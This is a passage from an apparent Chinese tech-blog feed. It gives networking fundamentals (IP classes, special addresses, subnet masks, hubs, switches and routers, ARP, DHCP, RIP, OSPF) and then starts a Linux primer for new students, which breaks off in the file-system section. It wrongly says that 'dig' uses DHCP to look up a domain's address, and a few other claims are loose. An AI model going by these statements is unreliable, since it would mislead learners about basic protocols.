MAC 地址通信，这是因为 MAC 地址不能跨路由接口运行。</p><h3 id="IP-地址分类"><a href="#IP-地址分类" class="headerlink" title="IP 地址分类"></a>IP 地址分类</h3><p>IP 地址根据 <em>网络号</em> 的不同分为 5 种类型：A 类地址、B 类地址、C 类地址、D 类地址和 E 类地址。A、B、C 三类常用于一般主机，D、E 两类有特殊用途。</p><ul><li><em>A 类地址</em><br>一个 A 类 IP 地址由 1 字节的网络地址和 3 字节主机地址组成。网络地址的最高位必须是 <code>0</code>，即第一段数字范围为 1~127。<br>每个 A 类地址理论上可连接 16777214 台主机，互联网中有 126 个可用的 A 类地址，用于政府机构、大型企业等。</li><li><em>B 类地址</em><br>一个 B 类 IP 地址由 2 字节的网络地址和 2 个字节的主机地址组成。网络地址的最高位必须是 <code>10</code>，即第一段数字范围为 128~191。<br>每个 B 类网络可以容纳 65534 台主机，用于中等规模的网络，如学校、公司、机构等。</li><li><em>C 类地址</em><br>一个 C 类 IP 地址由 3 字节的网络地址和 1 字节的主机地址组成，网络地址的最高位必须是 <code>110</code>，即第一段数字范围为 192~223。<br>每个 C 类网络最多只能包含 254 台计算机，用于小规模网络，如家庭、办公室、局域网等。</li><li><em>D 类地址</em><br>D 类 IP 地址第一个字节以 <code>1110</code> 开始，它是一个专门保留的地址。它并不指向特定的网络，目前这一类地址被用在多点广播（Multicast）中。</li><li><em>E 类地址</em><br>以 <code>11110</code> 开始，为将来使用保留。<code>240.0.0.0</code> 到 <code>255.255.255.254</code>，<code>255.255.255.255</code> 用于广播地址。</li></ul><h3 id="IPv4-IPv6"><a href="#IPv4-IPv6" class="headerlink" title="IPv4 &amp; IPv6"></a>IPv4 &amp; IPv6</h3><p><code>IPv4</code> 和 <code>IPv6</code> 都是互联网协议，用于在网络中传输数据。它们之间主要的区别在于地址长度和可用地址数量。</p><p><code>IPv4</code>（Internet Protocol Version 4）是网络层协议的第四个修订版本，也是此协议第一个被广泛部署和使用的版本。IPv4 地址由 32 位（4字节）地址组成，因此地址空间中只有约四十亿（4,294,967,296，2^32）个地址。<br>IPv4 是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上。此协议会尽最大努力交付数据包，意即它不保证任何数据包均能送达目的地，也不保证所有数据包均按照正确的顺序无重复地到达。<br>这些方面是由上层的传输协议（如传输控制协议）处理的¹。</p><p><em>IPv6</em>（Internet Protocol Version 6），也被称为 <em>IPng</em>（IP Next Generation），是网络层协议的第二代标准协议。<br>IPv6 可以看作 IPv4 的升级版，它们之间最显著的区别是：IP 地址的长度从 32 比特增加到 128 比特，这意味着 IPv6 具有比 IPv4 大得多的编码地址空间。因此新增的地址空间支持 2^128 （约3.4×10^38）个位址。</p><p>有句话怎么说来着：IPv6 允许人们给地球上每粒沙子都分配一个 IP 地址。这也能体现出 IPv6 编码地址空间的庞大。</p><h3 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h3><p><code>MAC地址</code>（Media Access Control）是网络设备的唯一标识，也被称为物理地址或硬件地址。它是由网卡生产厂家烧入网卡的 EPROM（一种闪存芯片），用来定义网络设备的位置。</p><h3 id="广播地址"><a href="#广播地址" class="headerlink" title="广播地址"></a>广播地址</h3><p><code>广播地址</code>（Broadcast Address）是一种特殊的 IP 地址，用于在网络中发送信息到所有设备。</p><p>广播地址专门用于同时向网络中（通常指同一子网）所有工作站发送数据的一个地址。<br>在使用 TCP&#x2F;IP 协议的网络中，主机号为 255 的 IP 地址为广播地址，广播的分组传送给同一个子网的所有计算机。</p><p>例如，对于 <code>10.1.1.0</code>（即 255.255.255.0）网段，其广播地址为 <code>10.1.1.255</code>，当发出一个目的地址为 <code>10.1.1.255</code> 的数据包时，它将被分发给该网段上的所有计算机。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231005150331.png" alt="广播地址示范"></p><p>广播地址主要有两类：</p><ul><li><em>受限广播</em><br>路由器不会转发受限广播的数据包，但同一个子网的所有主机都会接收到受限广播的数据包。IP 地址的网络号和主机号均为 255 就是受限广播地址 <code>255.255.255.255</code>。</li><li><em>直接广播&#x2F;定向广播</em><br>直接广播可以被路由转发，发送到目标网络的所有主机。例如，IP 地址为 <code>192.168.2.1</code> 的主机也可以发送广播到 <code>192.168.1.0</code> 网络。IP 地址的网络字段定义这个网络，主机号通常为 255，如 <code>192.168.10.0/24</code> 的直接广播地址为：<code>192.168.10.255</code>。</li></ul><h3 id="组播地址"><a href="#组播地址" class="headerlink" title="组播地址"></a>组播地址</h3><p>组播地址（Multicast Address）是用于一对多通信的一种特殊IP地址。它允许一个主机发送数据包到加入了特定组播组的所有主机。</p><h3 id="环回地址"><a href="#环回地址" class="headerlink" title="环回地址"></a>环回地址</h3><p>环回地址是一个特殊的 IP 地址，用于网络中的设备向自身发送通信。在 IPv4 中，回环地址的范围是 <code>127.0.0.1</code> 到 <code>127.255.255.254</code>。</p><p>环回地址有以下几个主要用途：</p><ol><li><em>测试网络配置</em><br>如果你能够成功地 ping 通 <code>127.0.0.1</code>，那就说明你的网络配置没有问题。</li><li><em>运行本地服务</em><br>有些服务器&#x2F;客户端应用程序在运行时需要调用服务器上的资源。当这些程序需要在同一台机器上运行而没有其他服务器时，可以将服务器的资源装在本机，将服务器的IP地址设为 <code>127.0.0.1</code>。</li><li><em>路由器管理</em><br>在配置路由器时，通常会将环回地址作为管理地址。例如，我们可以通过 telnet IP 到你所要管理的那个路由器，这个 IP 就是你所设置的环回地址。</li></ol><p>开发人员经常使用环回地址来测试网络应用。例如，如果你正在开发一个 Web 服务器，并且想要在本地测试它，你可以启动服务器并让它监听127.0.0.1 上的某个端口。然后，你可以打开浏览器并导航到<code>http://127.0.0.1:port</code>（其中 <code>port</code> 是你的服务器正在监听的端口），以查看服务器的响应。</p><p>关于我们常用的<code>localhost</code>和<code>127.0.0.1</code>，二者可以互换使用，实际上我们在使用时也是这么做的。但二者还是存在区别的：</p><ul><li><code>127.0.0.1</code> 不需要解析，<code>localhost</code> 需要解析查找其对应的 IP 地址。</li><li>依据上一条，<code>localhost</code> 并不一定解析为 <code>127.0.0.1</code>，也可能解析为地址环回块中的其它地址。</li></ul><h3 id="私有地址"><a href="#私有地址" class="headerlink" title="私有地址"></a>私有地址</h3><p>私有地址是指在互联网上不公开使用，而只在局域网内部使用的IP地址。私有地址的作用是节省公网IP地址的资源，同时也提高了网络安全性。私有地址有以下三个范围：</p><ul><li>A 类私有地址：<code>10.0.0.0</code> ~ <code>10.255.255.255</code>，可以容纳约 1.6 亿个主机，适用于大型网络。</li><li>B 类私有地址：<code>172.16.0.0</code> ~ <code>172.31.255.255</code>，可以容纳约 100 万个主机，适用于中等规模的网络。</li><li>C 类私有地址：<code>192.168.0.0</code> ~ <code>192.168.255.255</code>，可以容纳约 65000 个主机，适用于小型网络。</li></ul><p>私有地址不能直接访问互联网，需要通过网络地址转换（NAT）技术将其转换为公网IP地址才能与外部网络通信。</p><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>在了解“子网掩码”之前，你需要先知道 <a href="https://www.zhihu.com/question/21064101">什么是“子网”</a></p><p>子网掩码（Subnet Mask）是一种用于指明一个 IP 地址的哪些位标识的是主机所在的子网，以及哪些位标识的是主机的位掩码。它是一个 32 位的二进制数，通常被分割为 4 个“8 位二进制数”，对应到常用的十进制就是 <code>xxx.xxx.xxx.xxx</code>。子网掩码不能单独存在，它必须结合 IP 地址一起使用。</p><p>子网掩码的唯一作用是将某个 IP 地址划分成网络号和主机号两部分。这样做可以提高 IP 地址的分配效率，有效解决 IP 地址资源紧张的问题。同时，网路管理员也可以利用子网掩码，人为地将一个大型内网划分为更多个小规模的子网，再利用交换机的路由功能实现子网互联，从而有效解决了网络广播风暴和网络病毒等诸多网络管理方面的问题。</p><p>这里举个 Web 开发中使用子网掩码的例子：</p><p>假设我们有一个服务器，其 IP 地址为 <code>192.168.1.1</code>，并且我们希望该服务器只能与同一子网内的其他设备进行通信。这时，我们可以将子网掩码设置为 <code>255.255.255.0</code>，这样就只有 IP 地址在 <code>192.168.1.0</code> 到 <code>192.168.1.255</code> 范围内的设备才能与该服务器进行通信。</p><h2 id="常用设备"><a href="#常用设备" class="headerlink" title="常用设备"></a>常用设备</h2><h3 id="集线器-hub"><a href="#集线器-hub" class="headerlink" title="集线器 hub"></a><em>集线器 hub</em></h3><p>集线器充当网络中计算机和其他设备的连接点。<br>当集线器接收到来自某一端口的数据包后，它无法直接把数据包发送给目标节点，而是会采取“广播”的方式，把数据报发送给其他所有与集线器相连的端口。<br>所有与这个集线器相连的计算机都会接收到这个数据包，即使它们不是目标节点。</p><p>集线器有些缺点：以广播的方式传送数据不安全；数据包向所有节点同时发送可能造成网络堵塞，降低了网络执行效率；非双工传输的通信效率低……</p><p>但因为集线器便宜且易于设置使用，现实生活中集线器依然能够得到应用，比如家庭或小型企业的内部网络。但在注重效率和安全性的场合，会使用交换机代替集线器。</p><h3 id="交换机-switch"><a href="#交换机-switch" class="headerlink" title="交换机 switch"></a><em>交换机 switch</em></h3><p>交换机同样充当网络中计算机和其他设备的连接点。</p><p>交换机工作在模型的物理层和数据链路层，它通过自学习和维护 MAC 地址信息，对以太网帧进行高速而透明的交换转发。当接收到数据帧时，交换机会查找内存中的地址对照表以确定目的 MAC（网卡的硬件地址）的 NIC（网卡）挂接在哪个端口上。然后，通过内部交换矩阵迅速将数据包传送到目标端口，这种工作方式使得交换机具有更高的性能和安全性。</p><p>除此之外，相比于集线器，交换机有一些优点：<br>只有目标设备能看到数据包，这有效控制了网络流量，提高网络执行效率；<br>交换机能够实现全双工操作，这意味着交换机可以同时接收和发送数据，这种特性使得交换机在处理大量网络流量时具有很高的效率；<br>交换机可以使用 VLAN（虚拟局域网）技术来隔离广播，见效广播范围，进一步提高安全性和网络性能……</p><h3 id="路由器-router"><a href="#路由器-router" class="headerlink" title="路由器 router"></a><em>路由器 router</em></h3><p>路由器是一种智能的网络设备，通常是一个专门设计用来理解、操作和指导流量的小型计算设备，提供了路由和转送两种机制。<br>它工作在 OSI 模型的网络层，通过运行路由协议（如 RIP、OSPF、BGP）来维护一张路由表。路由表记录了不同目的地网络的最佳路径。</p><p>路由器决定数据包从来源端到目的端所经过的路径，这个过程称为 <em>路由</em>；路由器将输入端的数据包移送至适当的路由器输出端，这称为 <em>转送</em>。</p><p>当接收到数据包时，路由器会查看数据包的目标 IP 地址，并根据路由表选择合适的出口接口转发数据包。<br>如果目标 IP 地址不在路由表中，路由器会将数据包发送到默认网关。</p><p>这种工作方式使得路由器具有以下优点：</p><ul><li>路由器可以连接不同类型和规模的网络，如 LAN、WAN、MAN 等。</li><li>路由器可以根据网络拓扑和流量状况动态地调整最佳路径。</li><li>路由器可以过滤广播信息，减少网络拥塞。</li><li>路由器可以提供高级的安全功能，如防火墙、VPN、NAT 等。</li></ul><p>路由器，也被称为三层网络设备。</p><h3 id="网桥-bridge"><a href="#网桥-bridge" class="headerlink" title="网桥 bridge"></a><em>网桥 bridge</em></h3><p>网桥，也被称为桥接器，是一种用于连接两个局域网的存储&#x2F;转发设备。它能将一个大的局域网分割为多个网段，或将两个以上的局域网互联为一个逻辑局域网，使局域网上的所有用户都可以访问服务器。</p><p>网桥工作在数据链路层，在不同或相同类型的 LAN 之间存储并转发数据帧，必要时进行链路层上的协议转换。可连接两个或多个网络，在其中传送信息包。</p><h3 id="网关-gateway"><a href="#网关-gateway" class="headerlink" title="网关 gateway"></a><em>网关 gateway</em></h3><p>网关，又叫网间连接器、协议转换器，作用是在传输层以上实现网络互连，但仅用于两个高层协议不同的网络互连。</p><p>在传统 TCP&#x2F;IP 术语中，网络设备只分成两种：一种为网关，另一种为主机。网关能在网络间转递数据包，但主机不能转送数据包。在主机中，数据包需经过四层协议处理，但是在网关中只需要到达网络层，决定路径之后就可以转送。在当时，网关与路由器还没有区别。但在现代网络术语中，网关与路由器的定义不同：网关能在不同协议间移动资料，而路由器是在不同网络间移动资料。</p><p>网关既可以用于广域网互连，也可以用于局域网互连。<br>在使用不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。<br>与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求，并提供一定的过滤以及安全防护功能。</p><h2 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h2><p>太常见的就不做记录了，比如 TCP&#x2F;IP 和 HTTP，这种协议接触 Web 的时候就应该已经看了……</p><h3 id="ARP-RARP"><a href="#ARP-RARP" class="headerlink" title="ARP&#x2F;RARP"></a>ARP&#x2F;RARP</h3><p><code>ARP 协议</code>（Address Resolution Protocol）是一个用于将 IP 地址解析为 MAC 地址的协议。</p><p>当主机或路由器有数据要发送给另一台主机或路由器时，需要知道对方的网络层地址（即 IP 地址）。<br>主机发送信息时将包含目标 IP 地址的 ARP 请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；<br>收到返回消息后，将该 IP 地址和物理地址存入本机 ARP 缓存中并保留一定时间，下次请求时直接查询 ARP 缓存以节约资源。</p><p>在实际开发中，ARP 协议主要用于在同一局域网内进行通信。<br>当一个设备需要向另一个设备发送数据时，它会首先查看自己的 ARP 缓存，看是否已经有了目标设备的 MAC 地址。如果没有，它就会发送一个 ARP 请求，询问目标设备的MAC 地址。<br>然后，目标设备会回应这个请求，提供它的 MAC 地址，发送设备则将这个 MAC 地址保存在它的ARP缓存中，以便将来使用。</p><p><code>RARP 协议</code>（Reverse Address Resolution Protocol）则是根据 MAC 地址来获取 IP 地址。</p><p>RARP 允许局域网的物理机器从网关服务器的 ARP 表或缓存上请求 IP 地址。<br>例如，局域网中有一台主机只知道自己的物理地址而不知道自己的 IP 地址，那么可以通过 RARP 协议发出征求自身 IP 地址的广播请求，然后由 RARP 服务器负责回答。</p><p>在实际开发中，RARP 协议已经被 DHCP 协议所取代。</p><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p><code>DHCP 协议</code>（Dynamic Host Configuration Protocol）是一种用于动态分配和配置网络参数（如 IP 地址、子网掩码、默认网关等）的协议。它可以简化网络管理，提高 IP 地址的利用率，避免 IP 地址冲突等问题。</p><p>DHCP 协议的工作原理主要包括四个步骤¹：</p><ol><li><em>发现阶段</em><br>DHCP 客户端广播发送一个 <code>DHCP Discover</code> 报文，以发现网络中的 DHCP 服务器。</li><li><em>提供阶段</em><br>所有收到 Discover 报文的 DHCP 服务器都会发送一个 <code>DHCP Offer</code> 报文，告知用户本服务器可以为其提供IP地址。</li><li><em>请求阶段</em><br>DHCP 客户端选择一个 Offer 应答报文，并向该服务器发送一个广播的 <code>DHCP Request</code> 请求报文，通告选择的服务器，希望获得所分配的 IP 地址。</li><li><em>确认阶段</em><br>当 DHCP 服务器收到 Request 请求报文后，发送一个 <code>DHCP ACK</code> 应答报文，通知用户可以使用分配的 IP 地址。</li></ol><p>在实际开发中，DHCP 协议主要用于在局域网内动态分配 IP 地址。当一个设备需要获取网络参数时，它会向 DHCP 服务器发送请求，然后服务器会从预定义的地址池中分配一个 IP 地址，并将这个 IP 地址和其他相关信息（如子网掩码、默认网关等）返回给设备。<br>这样，设备就可以自动获取并配置网络参数，无需手动设置。</p><p>至于前文为什么说 RARP 协议已经被 DHCP 协议所取代，主要是因为 RARP 协议只能提供 IP 地址，而不能提供其他网络参数（如子网掩码、默认网关等）。<br>而且，RARP 协议需要在每台主机上都设置一个 RARP 服务器，这在大型网络中是不现实的。<br>相比之下，DHCP 协议可以提供完整的网络配置信息，并且只需要在网络中设置一个或几个 DHCP 服务器即可。</p><p>你可以使用 <code>dig</code> 命令在 Linux 下使用 DHCP 协议获取指定域名所在主机的公网 IP 地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig +short ma5hr00m.top @resolver1.opendns.com</span><br><span class="line"><span class="comment"># 如果你想查询更详细的信息，去除 +short 参数即可</span></span><br></pre></td></tr></table></figure><p>这条命令会向 <code>OpenDNS</code> 的解析器发送一个 DNS 查询请求，查询 <code>ma5hr00m.top</code> 域名的记录。<br>OpenDNS 的解析器会返回发送请求的公网 IP 。</p><h3 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h3><p>路由选择协议是一种网络协议，它决定了数据包在网络中的传输路径。这些协议基于不同的网络性能参数（如带宽、延迟、跳数等）来确定最优路径。</p><h4 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h4><p><code>RIP</code>（Routing Information Protocol）是一种基于距离向量的路由选择协议，最大的优点是简单。<br>RIP 协议要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录（距离向量）。<br>RIP 认为一个好的路由就是它通过的路由器的数目少，即 <em>距离短</em>，它要求一条路径最多只能包含 15 个路由器。</p><p>由于存在路由环路、可拓展性差等问题，RIP 逐渐被 OSPF 替代。</p><h4 id="OSPF"><a href="#OSPF" class="headerlink" title="OSPF"></a>OSPF</h4><p><code>OSPF </code>（Open Shortest Path First）是一种基于链路状态的路由协议，它从设计上就保证了无路由环路。<br>OSPF 支持区域的划分，区域内部的路由器使用 SPF 最短路径算法保证了区域内部的无环路。OSPF还利用区域间的连接规则保证了区域之间无路由环路。</p><p>在实际开发中，开发者通常需要配置网络设备（如路由器）以使用 OSPF 协议。</p><p>如果你想玩玩 OSPF 协议，可以参考这篇文章：<a href="https://blog.csdn.net/weixin_46505636/article/details/128629176">Ubuntu20.04 利用 FRR 配置 OSPF 路由协议</a></p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>关于 DNS 协议和 DNSSEC，可以看看这篇文章，写得更详细一些：<a href="/posts/network/dnssec">DNSSEC协议</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.runoob.com/w3cnote/summary-of-network.html">计算机网络基础知识总结 - 菜鸟教程</a></li><li><a href="https://www.jc2182.com/cn/cn-jiaocheng.html">计算机网络教程</a></li><li><a href="https://themillergroup.com/differences-hubs-switches-routers/">Hubs, Switches And Routers Explained</a></li><li><a href="https://www.jianshu.com/p/c793a279f698">计算机网络漫谈：OSI七层模型与TCP&#x2F;IP四层（参考）模型</a></li><li><a href="https://www.freecodecamp.org/chinese/news/osi-model-networking-layers/">白话 OSI 七层网络模型</a></li><li><a href="https://zhuanlan.zhihu.com/p/165142303">什么是网关，网关的作用是什么</a></li><li><a href="https://www.geeksforgeeks.org/tcp-ip-model/?ref=lbp">TCP&#x2F;IP Model</a></li><li><a href="https://blog.csdn.net/tennysonsky/article/details/45564479">广播地址介绍 - CSDN</a></li><li><a href="https://zhuanlan.zhihu.com/p/353821843">IP地址的分类及范围详解 - 知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/498255136">一文解析IP地址 - 知乎</a></li><li><a href="https://cloud.tencent.com/developer/article/2149791">什么是环回地址127.0.0.1</a></li><li><a href="https://zhuanlan.zhihu.com/p/371400090">子网掩码是什么？有什么作用？</a></li><li><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/ARP.html">什么是 ARP - 华为</a></li><li><a href="https://zhuanlan.zhihu.com/p/265293856">DHCP 详解 - 知乎</a></li><li><a href="https://blog.csdn.net/TheCarol/article/details/112106308">RIP 协议详解</a></li><li><a href="https://zhuanlan.zhihu.com/p/616791347">什么是OSPF？为什么要用OSPF？附OSPF配置实例</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向新生的Linux教程</title>
      <link href="/2023/10/09/2023/base-linux/"/>
      <url>/2023/10/09/2023/base-linux/</url>
      
        <content type="html"><![CDATA[<p>::: tip<br>2023 年 <em><strong>Vidar-Team</strong></em> 第四次新生培训 Linux 部分内容讲解。<br>:::</p><h2 id="什么是操作系统"><a href="#什么是操作系统" class="headerlink" title="什么是操作系统"></a>什么是操作系统</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>大家都知道计算机硬件和软件。硬件就是我们计算机的物理组成部分，比如内存、硬盘、键盘，都是些电子元件；软件就是大家常用的浏览器、游戏这些。<br>你单独使用硬件或软件都很难正常工作。想让计算机正常工作，就需要硬件和软件相互配合。而负责中间这个过程的，就是操作系统。</p><p>操作系统（Operating System），也就是我们说的 OS，本质上就是一组相互关联的软件程序。<br>操作系统是计算机最底层的软件，负责管理计算机的硬件和软件资源，控制着计算机的运行。</p><p>我们平常使用的应用程序，包括 vscode、firefox 这样的软件应用，以及我们写的 C 语言程序、Python 脚本什么的，都需要以操作系统为基本支撑。没有操作系统，这些应用程序就都无法正常运行。</p><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>如下图所示，操作系统可以简单划分为内核和系统调用两部分：</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231013143007.png" alt="操作系统抽象划分"></p><ul><li>内核：内核是操作系统的核心，它负责管理计算机的硬件资源，如CPU、内存、磁盘、网络等。内核可以基于权限和规则对资源访问进行裁决，保证系统的安全性和稳定性。内核运行在特权模式下，可以直接访问硬件设备和指令。</li><li>系统调用：系统调用是用户进程进入内核的接口层，它是由内核函数实现的。通过系统调用，用户进程可以临时切换到内核模式，使用内核提供的服务和功能，如文件操作、进程管理、网络通信等。系统调用对资源进行抽象，提供一致性接口，避免用户在使用资源时发生错误，且编程效率大大提高。</li></ul><p>一些系统组件运行在应用程序层，比如我们经常使用的 shell、图形界面等，它们也是操作系统的一部分。</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>Linux 是一个操作系统。它由 <em>Linus</em> 于 1991 年构思设计而成。最初这只是他的一项兴趣爱好。<br>现如今，经过多年的发展，这项兴趣爱好已经成为了拥有最大用户群的操作系统。</p><p><img src="https://pakhotin.org/wp-content/uploads/2023/07/53113-106400-Linux-xl.jpg" alt="Linux Logo"></p><p>在座的大多数人都在使用 Windows 操作系统，Windwos 足够满足大家的日常学习生活，比如写代码、玩游戏、看视频。<br>那我们今天为什么要来介绍 Linux 呢？</p><p>原因很简单。如果你未来要踏足计算机领域，不管你是要学习计算机安全，还是要做些其他的什么方向，你都会有茫茫多的场景需要接触到 Linux，你没法避开它。<br>不论你是否会把 Linux 当作主力操作系统，你都有必要学会使用它。</p><h2 id="Linux-的优势"><a href="#Linux-的优势" class="headerlink" title="Linux 的优势"></a>Linux 的优势</h2><p>现在来说说我们为什么要使用 Linux。</p><p>Linux 自带强大的命令行工具，可以完成各种工作，比如文件操作、网络通信、进程管理等，而不需要使用图形化界面。<br>以前有很多设置你可能需要在 windows 的系统设置里面翻来翻去，而在 Linux 下，你只需要打开命令行，敲一些指令就行。</p><p>此外，相比 Windows 系统，Linux 可以做到更加高效，更加安全，更加稳定，以及更小的损耗。<br>这些优势使得 Linux 在服务器领域占据了大量份额，对运维来说，熟练使用 Linux 是必备技能。</p><p>同时，Linux 还是一款开源的操作系统，每个人都可以下载其源代码进行定制。<br>这使得 Linux 有着强大的生命力，可以适应各种场景的需求，也促生了 Linux 活跃的社区生态。</p><p>现阶段，对大家来说，使用 Linux 最大的好处就是可以快速地搭建各种环境。</p><p>比如，你现在想要在 Windows 系统中配置一个基本的 Java 开发环境（<a href="https://www.runoob.com/java/java-environment-setup.html">教程</a>），<br>你需要先去 Java 官网下载 JDK，然后安装，接着配置 <code>JAVA_HOME</code> 等环境变量，这样才能开始写代码。一些没有经验的新生就会在这里消耗大量时间。<br>而在 Linux 下你不需要这么麻烦，多数情况下，你只需要使用一行类似的命令就可以完成上述工作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure><p>当这句指令执行成功后，你就可以开始写代码了。非常轻松愉快，也节省了很多时间，让你专注于 Java 语言本身，而非繁琐的环境配置。</p><h2 id="发行版"><a href="#发行版" class="headerlink" title="发行版"></a>发行版</h2><p>Linux 操作系统分为很多种，这些不同的 Linux 统称为 Linux 发行版（<em>Linux distribution</em>）。</p><p>这些发行版都是基于 Linux 内核的，它们之间的差异主要体现在软件包管理工具、软件包源、软件包版本等方面，我们一会儿会做详细讲解。</p><p>大家可以看这张图，这张图展示了一些常见的 Linux 发行版：</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231015001556.png" alt="常见Linux发行版"></p><p>从这张图里，大家可以看到现在当下流行的一些发行版，比如 <code>Ubuntu</code>、<code>Fedora</code>、<code>ArchLinux</code>、<code>CentOS</code> 等等。<br>这些发行版各有特点，有各自的适用场景，也都有着庞大的用户群体以及高度活跃的社区生态。</p><p>实际上，现有的 Linux 发行版远不止图中展示的这些，现在光是被记录 Linux 版本列表中的就有超过 300 个。<br>它们大多数都正处于活跃的开发中，由不同的公司、组织或其他群体进行维护，不断地被改进。</p><p>接下来，我们会以 <code>Ubuntu22.04</code> 为例，来介绍 Linux 操作系统的一些常见概念以及基本使用方法。</p><h2 id="来，Ubuntu！"><a href="#来，Ubuntu！" class="headerlink" title="来，Ubuntu！"></a>来，Ubuntu！</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在自己的计算机中安装一个 Ubuntu 系统有以下几种方式：</p><ol><li>安装到VMware，Virtual Box等虚拟机软件里（推荐），这也是大多数初学者的选择。</li><li>安装到物理机上，单系统或双系统，但不推荐大家这样做。<br>刚开始你直接单系统的话可能会出各种各样的问题，你可能会在一段时间内不断的搞坏自己的系统，然后重装，然后再搞坏，然后再重装，但这个折腾的过程中你也能学到很多东西，看你愿不愿意花这个时间。<br>双系统的话，确实兼具了使用 Windows 的方便和体验 Linux 物理机的优势，但你有可能会遇到一些奇奇怪怪的问题，而这些问题你去网上有时候很难搜到解决方案，会耗费你很多时间。</li><li>WSL（<em>Windows Subsystem for Linux</em>）也是一种可选方案，这是微软为 Windows 提供的一个 Linux 子系统。<br>但 WSL 相比虚拟机或者物理机来说都会有一些限制，比如你无法使用图形界面，无法使用一些特殊的硬件设备等等。</li></ol><p>关于如何在自己的计算机中安装一个 Ubuntu 系统，今天不会讲解具体步骤，这次分享会之前我们已经在群里发过了详细的教程，大家可以从群文件中找到那份文件，自行查阅。<br>网上也有详细的教程，大家也都可以搜到。</p><h3 id="换源-包管理"><a href="#换源-包管理" class="headerlink" title="换源 &amp; 包管理"></a>换源 &amp; 包管理</h3><p>当你在安装好 Ubuntu 虚拟机后，你可以看到这样的桌面：</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231015005727.png" alt="Ubuntu默认桌面"></p><p>乍一看还是和 <code>windows</code> 区别蛮大的。</p><p>为了方便的安装各种软件，我们需要先了解一下软件源和包管理工具。</p><p>软件源（<em>software source</em>）是指存放软件包的服务器，它们通常由软件开发商或者 Linux 发行版的维护者维护。</p><p>包管理工具（<em>package manager</em>）是指用于安装、更新、卸载软件包的工具，它们可以从软件源中下载软件包，然后安装到系统中。<br><code>Ubuntu</code> 自带的包管理工具是 <code>apt</code>，它的软件源默认是国外的。</p><p>出于一些众所周知的原因，国内用户访问国外链接会比较慢，有时候还会请求超时。<br>不管不问的话用起来会很不爽。<br>为了解决问题，我们需要对我们的软件源进行更换，一般是将其更换为国内源，比如清华镜像源。</p><p>我们可以使用指令来完成换源的操作，具体指令可以看看群里的文档，这里就不再赘述了。</p><p>在换源之后，我们需要执行命令更新软件包列表 <code>sudo apt update</code>。<br>成功执行后，我们就可以使用 <code>apt</code> 来方便地管理软件了。</p><p>常用的 <code>apt</code> 指令有图片中这些，不需要刻意去记，你自己用几次就熟悉了。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231015010916.png" alt="常用apt指令"></p><p>除了 apt，其他 Linux 发行版也都有各自的包管理工具，比如 CentOS 的 <code>yum</code>、Fedora 的 <code>dnf</code>、Arch 的 <code>pacman</code> 等等。<br>他们的使用方法都差不多，也都是用来管理软件包的。<br>根据自己用的发行版来就好了。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231014223037.png" alt="根据包管理器划分Linux发行版"></p><p>上面这张图是根据包管理工具的不同对当前常见的 Linux 发行版做的一个分类。</p><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>现在来说说目录结构，这也是 Windows 和 Linux 之间的一个重要区别。</p><p>Windows 的目录结构是以物理存储介质为主，通过分区来实现文件目录的管理，每个分区被视为一个独立的盘符，如 C 盘、D 盘等等。<br>不同分区之间相互独立，联系并不紧密。</p><p>而在 Linux 中，所有分区都被挂载到根目录下，所有的文件和目录都被组织成以一个跟节点开始的树形结构。<br>这个树形结构就是 Linux 的文件系统。</p><p>打开 Linux 的终端，输入 <code>ls /</code>，你就可以看到根目录下的所有文件和目录。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231015105831.png" alt="ls &#x2F; 执行结果"></p><p>Linux 的根目录是 <code>/</code>，它是整个文件系统的起点，在根目录之下的既可以是其他目录，也可以是文件。<br>而每一个目录中又可以包含其他目录和文件，如此反复就构成了一个庞大的文件系统。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231015113020.png" alt="Linux文件系统"></p><p>根目录下的每个目录都有各自作用。</p><p>比如这里的 <code>/home</code> 目录，就是用户的主目录。在 Linux 中，每个用户都有自己的主目录，用来存放用户的个人文件。<br>用户主目录一般是以用户的帐号命名的，比如上图中的 alice、bob、eve。</p><p>再比如这里的 